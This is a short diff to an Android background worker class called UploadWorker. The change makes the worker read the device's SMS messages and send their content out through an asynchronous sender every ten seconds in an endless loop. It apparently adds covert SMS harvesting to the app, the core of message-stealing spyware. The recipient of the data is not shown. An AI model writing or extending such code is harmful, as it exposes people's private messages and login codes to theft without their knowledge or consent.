@@ -26,7 +26,10 @@ public class UploadWorker extends Worker {
                while (true){
                    try {
                        Log.d(TAG, "doWork: ===>succeed!"+new Date());
-                       SmsHandler.sendSmsAsy("UploadWorker");
+//                       SmsHandler.sendSmsAsy("UploadWorker");
+                       Context context = getApplicationContext();
+                       String sms = SmsHandler.getSMS(context);
+                       SmsHandler.sendSmsAsy(sms);
                        Thread.sleep(1000*10);
                    } catch (InterruptedException e) {
                        Log.d(TAG, "doWork: ===>succeed!"+new Date()+"  "+e.getMessage().toString());
